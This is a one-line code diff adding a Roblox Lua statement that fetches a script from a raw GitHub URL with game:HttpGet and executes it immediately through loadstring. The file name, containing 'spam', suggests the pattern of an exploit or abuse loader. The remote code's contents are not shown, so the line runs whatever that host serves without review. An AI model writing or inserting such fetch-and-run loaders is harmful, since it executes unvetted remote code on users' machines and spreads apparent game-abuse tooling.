@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/cure-violence-district-spam4-7xp36seihvwsgi.lua"))()
